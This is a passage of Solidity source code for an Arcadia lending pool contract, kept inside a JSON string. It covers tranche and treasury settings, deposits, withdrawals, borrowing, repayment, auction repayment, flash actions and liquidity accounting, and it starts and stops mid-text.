providers.\n    // Does not take into account pending interests.\n    mapping(address => uint256) internal realisedLiquidityOf;\n    // Map Account => owner => beneficiary => amount.\n    // Stores the credit allowances for a beneficiary per Account and per Owner.\n    mapping(address => mapping(address => mapping(address => uint256))) public creditAllowance;\n\n    /* //////////////////////////////////////////////////////////////\n                                EVENTS\n    ////////////////////////////////////////////////////////////// */\n\n    event AuctionStarted(address indexed account, address indexed creditor, uint128 openDebt);\n    event AuctionFinished(\n        address indexed account,\n        address indexed creditor,\n        uint256 startDebt,\n        uint256 initiationReward,\n        uint256 terminationReward,\n        uint256 penalty,\n        uint256 badDebt,\n        uint256 surplus\n    );\n    event Borrow(\n        address indexed account, address indexed by, address to, uint256 amount, uint256 fee, bytes3 indexed referrer\n    );\n    event CreditApproval(address indexed account, address indexed owner, address indexed beneficiary, uint256 amount);\n    event InterestSynced(uint256 interest);\n    event InterestWeightTrancheUpdated(address indexed tranche, uint8 indexed trancheIndex, uint16 interestWeight);\n    event LiquidationWeightTrancheUpdated(uint16 liquidationWeight);\n    event PoolStateUpdated(uint256 totalDebt, uint256 totalLiquidity, uint80 interestRate);\n    event Repay(address indexed account, address indexed from, uint256 amount);\n    event TranchePopped(address tranche);\n    event TreasuryWeightsUpdated(uint16 interestWeight, uint16 liquidationWeight);\n\n    /* //////////////////////////////////////////////////////////////\n                                MODIFIERS\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Checks if caller is the Liquidator.\n     */\n    modifier onlyLiquidator() {\n        if (LIQUIDATOR != msg.sender) revert LendingPoolErrors.Unauthorized();\n        _;\n    }\n\n    /**\n     * @notice Checks if caller is a Tranche.\n     */\n    modifier onlyTranche() {\n        if (!isTranche[msg.sender]) revert LendingPoolErrors.Unauthorized();\n        _;\n    }\n\n    /**\n     * @notice Syncs interest to LPs and treasury and updates the interest rate.\n     */\n    modifier processInterests() {\n        _syncInterests();\n        _;\n        // _updateInterestRate() modifies the state (effect), but can safely be called after interactions.\n        // Cannot be exploited by re-entrancy attack.\n        _updateInterestRate(realisedDebt, totalRealisedLiquidity);\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                                CONSTRUCTOR\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice The constructor for a lending pool.\n     * @param riskManager_ The address of the new Risk Manager.\n     * @param asset_ The underlying ERC20 token of the Lending Pool.\n     * @param treasury_ The address of the protocol treasury.\n     * @param accountFactory The contract address of the Arcadia Account Factory.\n     * @param liquidator The contract address of the Liquidator.\n     * @dev The name and symbol of the DebtToken are automatically generated, based on the name and symbol of the underlying token.\n     */\n    constructor(address riskManager_, ERC20 asset_, address treasury_, address accountFactory, address liquidator)\n        LendingPoolGuardian()\n        Creditor(riskManager_)\n        DebtToken(asset_)\n    {\n        treasury = treasury_;\n        ACCOUNT_FACTORY = accountFactory;\n        LIQUIDATOR = liquidator;\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                            TRANCHES LOGIC\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Adds a tranche to the Lending Pool.\n     * @param tranche The address of the Tranche.\n     * @param interestWeight_ The interest weight of the specific Tranche.\n     * @dev The order of the tranches is important, the most senior tranche is added first at index 0, the most junior at the last index.\n     * @dev Each Tranche is an ERC4626 contract.\n     * @dev The interest weight of each Tranche determines the relative share of the yield (interest payments) that goes to its Liquidity providers.\n     */\n    function addTranche(address tranche, uint16 interestWeight_) external onlyOwner processInterests {\n        if (auctionsInProgress > 0) revert LendingPoolErrors.AuctionOngoing();\n        if (isTranche[tranche]) revert LendingPoolErrors.TrancheAlreadyExists();\n\n        totalInterestWeight += interestWeight_;\n        interestWeightTranches.push(interestWeight_);\n        interestWeight[tranche] = interestWeight_;\n\n        uint8 trancheIndex = uint8(tranches.length);\n        tranches.push(tranche);\n        isTranche[tranche] = true;\n\n        emit InterestWeightTrancheUpdated(tranche, trancheIndex, interestWeight_);\n    }\n\n    /**\n     * @notice Changes the interest weight of a specific Tranche.\n     * @param index The index of the Tranche for which a new interest weight is being set.\n     * @param interestWeight_ The new interest weight of the Tranche at the index.\n     * @dev The interest weight of each Tranche determines the relative share of yield (interest payments) that goes to its Liquidity providers.\n     */\n    function setInterestWeightTranche(uint256 index, uint16 interestWeight_) external onlyOwner processInterests {\n        if (index >= tranches.length) revert LendingPoolErrors.NonExistingTranche();\n        totalInterestWeight = totalInterestWeight - interestWeightTranches[index] + interestWeight_;\n        interestWeightTranches[index] = interestWeight_;\n        address tranche = tranches[index];\n        interestWeight[tranche] = interestWeight_;\n\n        emit InterestWeightTrancheUpdated(tranche, uint8(index), interestWeight_);\n    }\n\n    /**\n     * @notice Changes the liquidation weight of the most Junior Tranche.\n     * @param liquidationWeight The new liquidation weight of the Tranche at the highest index.\n     * @dev The liquidation weight determines the relative share of liquidation fees that goes to the most Junior Tranche.\n     */\n    function setLiquidationWeightTranche(uint16 liquidationWeight) external onlyOwner {\n        emit LiquidationWeightTrancheUpdated(liquidationWeightTranche = liquidationWeight);\n    }\n\n    /**\n     * @notice Removes the Tranche at the last index (most junior).\n     * @param index The index of the last Tranche.\n     * @param tranche The address of the last Tranche.\n     * @dev This function can only be called by the function _processDefault(uint256 assets),\n     * when there is a default as big as (or bigger than) the complete amount of liquidity of the most junior Tranche.\n     * @dev Passing the input parameters to the function saves gas compared to reading the address and index of the last Tranche from storage.\n     * No need to check if index and Tranche are indeed of the last tranche since function is only called by _processDefault.\n     */\n    function _popTranche(uint256 index, address tranche) internal {\n        unchecked {\n            totalInterestWeight -= interestWeightTranches[index];\n        }\n        isTranche[tranche] = false;\n        interestWeightTranches.pop();\n        tranches.pop();\n        interestWeight[tranche] = 0;\n\n        emit TranchePopped(tranche);\n    }\n\n    /* ///////////////////////////////////////////////////////////////\n                    TREASURY FEE CONFIGURATION\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Changes the interest and liquidation weight of the Treasury.\n     * @param interestWeight_ The new interestWeight of the treasury.\n     * @param liquidationWeight The new liquidationWeight of the treasury.\n     * @dev The interestWeight determines the relative share of the yield (interest payments) that goes to the protocol treasury.\n     * @dev Setting interestWeightTreasury to a very high value will cause the treasury to collect all interest fees from that moment on.\n     * Although this will affect the future profits of liquidity providers, no funds nor realized interest are at risk for LPs.\n     */\n    function setTreasuryWeights(uint16 interestWeight_, uint16 liquidationWeight) external onlyOwner processInterests {\n        totalInterestWeight = totalInterestWeight - interestWeightTreasury + interestWeight_;\n\n        emit TreasuryWeightsUpdated(\n            interestWeightTreasury = interestWeight_, liquidationWeightTreasury = liquidationWeight\n        );\n    }\n\n    /**\n     * @notice Sets new treasury address.\n     * @param treasury_ The new address of the treasury.\n     */\n    function setTreasury(address treasury_) external onlyOwner {\n        treasury = treasury_;\n    }\n\n    /**\n     * @notice Sets the new origination fee.\n     * @param originationFee_ The new origination fee.\n     * @dev originationFee is limited by being a uint8 -> max value is 2.55%\n     * 4 decimal precision (10 = 0.1%).\n     */\n    function setOriginationFee(uint8 originationFee_) external onlyOwner {\n        originationFee = originationFee_;\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                        DEPOSIT/WITHDRAWAL LOGIC\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Deposit assets in the Lending Pool.\n     * @param assets The amount of assets of the underlying ERC20 tokens being deposited.\n     * @param from The address of the Liquidity Provider who deposits the underlying ERC20 token via a Tranche.\n     * @dev This function can only be called by Tranches.\n     */\n    function depositInLendingPool(uint256 assets, address from)\n        external\n        whenDepositNotPaused\n        onlyTranche\n        processInterests\n    {\n        // Need to transfer before minting or ERC777s could reenter.\n        // Address(this) is trusted -> no risk on re-entrancy attack after transfer.\n        asset.safeTransferFrom(from, address(this), assets);\n\n        unchecked {\n            realisedLiquidityOf[msg.sender] += assets;\n            totalRealisedLiquidity = SafeCastLib.safeCastTo128(assets + totalRealisedLiquidity);\n        }\n    }\n\n    /**\n     * @notice Donate assets to the Lending Pool.\n     * @param trancheIndex The index of the tranche to donate to.\n     * @param assets The amount of assets of the underlying ERC20 tokens being deposited.\n     * @dev Can be used by anyone to donate assets to the Lending Pool.\n     * It is supposed to serve as a way to compensate the jrTranche after an\n     * auction didn't get sold and was manually liquidated after cutoffTime.\n     * @dev Inflation attacks by the first depositor in the Tranches have to be prevented with virtual assets/shares.\n     */\n    function donateToTranche(uint256 trancheIndex, uint256 assets) external whenDepositNotPaused processInterests {\n        if (assets == 0) revert LendingPoolErrors.ZeroAmount();\n\n        address tranche = tranches[trancheIndex];\n\n        // Need to transfer before donating or ERC777s could reenter.\n        // Address(this) is trusted -> no risk on re-entrancy attack after transfer.\n        asset.safeTransferFrom(msg.sender, address(this), assets);\n\n        unchecked {\n            realisedLiquidityOf[tranche] += assets; //[̲̅$̲̅(̲̅ ͡° ͜ʖ ͡°̲̅)̲̅$̲̅]\n            totalRealisedLiquidity = SafeCastLib.safeCastTo128(assets + totalRealisedLiquidity);\n        }\n    }\n\n    /**\n     * @notice Withdraw assets from the Lending Pool.\n     * @param assets The amount of assets of the underlying ERC20 tokens being withdrawn.\n     * @param receiver The address of the receiver of the underlying ERC20 tokens.\n     * @dev This function can be called by anyone with an open balance (realisedLiquidityOf[address] bigger than 0),\n     * which can be both Tranches as other address (treasury, Liquidation Initiators, Liquidated Account Owner...).\n     */\n    function withdrawFromLendingPool(uint256 assets, address receiver)\n        external\n        whenWithdrawNotPaused\n        processInterests\n    {\n        if (realisedLiquidityOf[msg.sender] < assets) revert LendingPoolErrors.AmountExceedsBalance();\n\n        unchecked {\n            realisedLiquidityOf[msg.sender] -= assets;\n            totalRealisedLiquidity = SafeCastLib.safeCastTo128(totalRealisedLiquidity - assets);\n        }\n\n        asset.safeTransfer(receiver, assets);\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                            LENDING LOGIC\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Approve a beneficiary to take out debt against an Arcadia Account.\n     * @param beneficiary The address of the beneficiary who can take out debt backed by an Arcadia Account.\n     * @param amount The amount of underlying ERC20 tokens to be lent out.\n     * @param account The address of the Arcadia Account backing the debt.\n     */\n    function approveBeneficiary(address beneficiary, uint256 amount, address account) external {\n        // If Account is not an actual address of an Arcadia Account, ownerOfAccount(address) will return the zero address.\n        if (IFactory(ACCOUNT_FACTORY).ownerOfAccount(account) != msg.sender) revert LendingPoolErrors.Unauthorized();\n\n        creditAllowance[account][msg.sender][beneficiary] = amount;\n\n        emit CreditApproval(account, msg.sender, beneficiary, amount);\n    }\n\n    /**\n     * @notice Takes out debt backed by collateral in an Arcadia Account.\n     * @param amount The amount of underlying ERC20 tokens to be lent out.\n     * @param account The address of the Arcadia Account backing the debt.\n     * @param to The address who receives the lent out underlying tokens.\n     * @param referrer A unique identifier of the referrer, who will receive part of the fees generated by this transaction.\n     * @dev The sender might be different than the owner if they have the proper allowances.\n     */\n    function borrow(uint256 amount, address account, address to, bytes3 referrer)\n        external\n        whenBorrowNotPaused\n        processInterests\n    {\n        // If Account is not an actual address of an Account, ownerOfAccount(address) will return the zero address.\n        address accountOwner = IFactory(ACCOUNT_FACTORY).ownerOfAccount(account);\n        if (accountOwner == address(0)) revert LendingPoolErrors.IsNotAnAccount();\n\n        uint256 amountWithFee = amount + amount.mulDivUp(originationFee, ONE_4);\n\n        // Check allowances to take debt.\n        if (accountOwner != msg.sender) {\n            uint256 allowed = creditAllowance[account][accountOwner][msg.sender];\n            if (allowed != type(uint256).max) {\n                creditAllowance[account][accountOwner][msg.sender] = allowed - amountWithFee;\n            }\n        }\n\n        // Mint debt tokens to the Account.\n        _deposit(amountWithFee, account);\n\n        // Add origination fee to the treasury.\n        unchecked {\n            if (amountWithFee - amount > 0) {\n                totalRealisedLiquidity = SafeCastLib.safeCastTo128(amountWithFee + totalRealisedLiquidity - amount);\n                realisedLiquidityOf[treasury] += amountWithFee - amount;\n            }\n        }\n\n        // UpdateOpenPosition checks that the Account indeed has opened a margin account for this Lending Pool and\n        // checks that it is still healthy after the debt is increased with amountWithFee.\n        // Reverts in Account if one of the checks fails.\n        uint256 accountVersion = IAccount(account).increaseOpenPosition(maxWithdraw(account));\n        if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();\n\n        // Transfer fails if there is insufficient liquidity in the pool.\n        asset.safeTransfer(to, amount);\n\n        emit Borrow(account, msg.sender, to, amount, amountWithFee - amount, referrer);\n    }\n\n    /**\n     * @notice Repays debt.\n     * @param amount The amount of underlying ERC20 tokens to be repaid.\n     * @param account The contract address of the Arcadia Account backing the debt.\n     * @dev if Account is not an actual address of an Arcadia Account, maxWithdraw(account) will always return 0.\n     * Function will not revert, but amount is always 0.\n     * @dev Anyone (EOAs and contracts) can repay debt in the name of an Account.\n     */\n    function repay(uint256 amount, address account) external whenRepayNotPaused processInterests {\n        uint256 accountDebt = maxWithdraw(account);\n        amount = accountDebt > amount ? amount : accountDebt;\n\n        // Need to transfer before burning debt or ERC777s could reenter.\n        // Address(this) is trusted -> no risk on re-entrancy attack after transfer.\n        asset.safeTransferFrom(msg.sender, address(this), amount);\n\n        _withdraw(amount, address(this), account);\n\n        emit Repay(account, msg.sender, amount);\n    }\n\n    /**\n     * @notice Repays debt via an auction.\n     * @param startDebt The amount of debt of the Account the moment the liquidation was initiated.\n     * @param minimumMargin_ The minimum margin of the Account.\n     * @param amount The amount repaid by a bidder during the auction.\n     * @param account The contract address of the Arcadia Account backing the debt.\n     * @param bidder The address of the bidder.\n     * @return earlyTerminate Bool indicating whether the full amount of debt was repaid.\n     * @dev This function allows a liquidator to repay a specified amount of debt for a user.\n     */\n    function auctionRepay(uint256 startDebt, uint256 minimumMargin_, uint256 amount, address account, address bidder)\n        external\n        whenLiquidationNotPaused\n        onlyLiquidator\n        processInterests\n        returns (bool earlyTerminate)\n    {\n        // Need to transfer before burning debt or ERC777s could reenter.\n        // Address(this) is trusted -> no risk on re-entrancy attack after transfer.\n        asset.safeTransferFrom(bidder, address(this), amount);\n\n        uint256 accountDebt = maxWithdraw(account);\n        if (accountDebt == 0) revert LendingPoolErrors.IsNotAnAccountWithDebt();\n        if (accountDebt <= amount) {\n            // The amount recovered by selling assets during the auction is bigger than the total debt of the Account.\n            // -> Terminate the auction and make the surplus available to the Account-Owner.\n            earlyTerminate = true;\n            unchecked {\n                _settleLiquidationHappyFlow(account, startDebt, minimumMargin_, bidder, (amount - accountDebt));\n            }\n            amount = accountDebt;\n        }\n\n        _withdraw(amount, address(this), account);\n\n        emit Repay(account, bidder, amount);\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                        LEVERAGED ACTIONS LOGIC\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Execute and interact with external logic on leverage.\n     * @param amountBorrowed The amount of underlying ERC20 tokens to be lent out.\n     * @param account The address of the Arcadia Account backing the debt.\n     * @param actionTarget The address of the Action Target to call.\n     * @param actionData A bytes object containing three actionAssetData structs, an address array and a bytes array.\n     * @param referrer A unique identifier of the referrer, who will receive part of the fees generated by this transaction.\n     * @dev The sender might be different than the owner if they have the proper allowances.\n     * @dev accountManagementAction() works similar to flash loans, this function optimistically calls external logic and checks for the Account state at the very end.\n     */\n    function flashAction(\n        uint256 amountBorrowed,\n        address account,\n        address actionTarget,\n        bytes calldata actionData,\n        bytes3 referrer\n    ) external whenBorrowNotPaused processInterests {\n        // If Account is not an actual address of a Account, ownerOfAccount(address) will return the zero address.\n        address accountOwner = IFactory(ACCOUNT_FACTORY).ownerOfAccount(account);\n        if (accountOwner == address(0)) revert LendingPoolErrors.IsNotAnAccount();\n\n        uint256 amountBorrowedWithFee = amountBorrowed + amountBorrowed.mulDivUp(originationFee, ONE_4);\n\n        // Check allowances to take debt.\n        if (accountOwner != msg.sender) {\n            // Since calling accountManagementAction() gives the sender full control over all assets in the Account,\n            // Only Beneficiaries with maximum allowance can call the flashAction function.\n            if (creditAllowance[account][accountOwner][msg.sender] != type(uint256).max) {\n                revert LendingPoolErrors.Unauthorized();\n            }\n        }\n\n        // Mint debt tokens to the Account, debt must be minted before the actions in the Account are performed.\n        _deposit(amountBorrowedWithFee, account);\n\n        // Add origination fee to the treasury.\n        unchecked {\n            if (amountBorrowedWithFee - amountBorrowed > 0) {\n                totalRealisedLiquidity += SafeCastLib.safeCastTo128(amountBorrowedWithFee - amountBorrowed);\n                realisedLiquidityOf[treasury] += amountBorrowedWithFee - amountBorrowed;\n            }\n        }\n\n        // Need to update the actionTimestamp before transferring tokens,\n        // or ERC777s could reenter to frontrun Account transfers.\n        IAccount(account).updateActionTimestampByCreditor();\n\n        // Send Borrowed funds to the actionTarget.\n        asset.safeTransfer(actionTarget, amountBorrowed);\n\n        // The Action Target will use the borrowed funds (optionally with additional assets withdrawn from the Account)\n        // to execute one or more actions (swap, deposit, mint...).\n        // Next the action Target will deposit any of the remaining funds or any of the recipient token\n        // resulting from the actions back into the Account.\n        // As last step, after all assets are deposited back into the Account a final health check is done:\n        // The Collateral Value of all assets in the Account is bigger than the total liabilities against the Account (including the debt taken during this function).\n        // flashActionByCreditor also checks that the Account indeed has opened a margin account for this Lending Pool.\n        {\n            uint256 accountVersion = IAccount(account).flashActionByCreditor(actionTarget, actionData);\n            if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();\n        }\n\n        unchecked {\n            emit Borrow(\n                account, msg.sender, actionTarget, amountBorrowed, amountBorrowedWithFee - amountBorrowed, referrer\n            );\n        }\n    }\n\n    /* //////////////////////////////////////////////////////////////\n                            ACCOUNTING LOGIC\n    ////////////////////////////////////////////////////////////// */\n\n    /**\n     * @notice Returns the total amount of outstanding debt in the underlying asset.\n     * @return totalDebt The total debt in underlying assets.\n     */\n    function totalAssets() public view override returns (uint256 totalDebt) {\n        // Avoid a second calculation of unrealised debt (expensive)\n        // if interests are already synced this block.\n        if (lastSyncedTimestamp != uint32(block.timestamp)) {\n            totalDebt = realisedDebt + calcUnrealisedDebt();\n        } else {\n            totalDebt = realisedDebt;\n        }\n    }\n\n    /**\n     * @notice Returns the total redeemable amount of liquidity in the underlying asset.\n     * @return totalLiquidity_ The total redeemable amount of liquidity in the underlying asset.\n     */\n    function totalLiquidity() external view returns (uint256 totalLiquidity_) {\n        // Avoid a second calculation of unrealised debt (expensive)\n        // if interests are already synced this block.\n        if (lastSyncedTimestamp != uint32(block.timestamp)) {\n            // The total liquidity equals the sum of the realised liquidity, and the pending interests.\n            unchecked {\n                totalLiquidity_ = totalRealisedLiquidity + calcUnrealisedDebt();\n            }\n        } else {\n            totalLiquidity_ = totalRealisedLiquidity;\n        }\n    }\n\n    /**\n     * @notice Returns the redeemable amount of liquidity in the underlying asset of an address.\n     * @param owner_ The address of the liquidity provider.\n     * @return assets The redeemable amount of liquidity in the underlying asset.\n     * @dev This function syncs the interests to prevent calculating UnrealisedDebt twice when depositing/withdrawing through the Tranches.\n     * @dev After calling this function, the interest rate will not be updated until the next processInterests() call.\n     */\n    function liquidityOfAndSync(address owner_) external returns (uint256 assets) {\n        _syncInterests();\n        assets = realisedLiquidityOf[owner_];\n    }\n\n    /**\n     * @notice Returns the redeemable amount of liquidity in the underlying asset of an address.\n     * @param owner_ The address of the liquidity provider.\n     * @return assets The redeemable amount of liquidity in the underlying asset.\n     */\n    function liquidityOf(address owner_) external view returns (uint256 assets) {\n        // Avoid a second calculation of unrealised debt (expensive).\n        // if interests are already synced this block.\n        if (lastSyncedTimestamp != uint32(block.timestamp)) {\n            // The total liquidity of a tranche equals the sum of the realised liquidity\n            // of the tranche, and its pending interests.\n            uint256 interest = calcUnrealisedDebt().mulDivDown(interestWeight[owner_], totalInterestWeight);\n            unchecked {\n                assets = realisedLiquidityOf[owner_] + interest;\n            }\n        } else {\n            assets = realisedLiquidityOf[owner_];\n        }\n    }\n\n    /**\n     * @notice Skims any surplus funds in the LendingPool to the treasury.\n     * @dev In normal conditions (when there are no ongoing auctions), the total Claimable Liquidity should be equal\n     * to the sum of the available funds (the balanceOf() the underlying asset) in the pool and the total open debt.\n     * In practice the actual sum of available funds and total open debt will always be bigger than the total Claimable Liquidity.\n     * This because of the rounding errors of the ERC4626 calculations (conversions between assets and shares),\n     * or because someone accidentally sent funds directly to the"
    }
  ]
}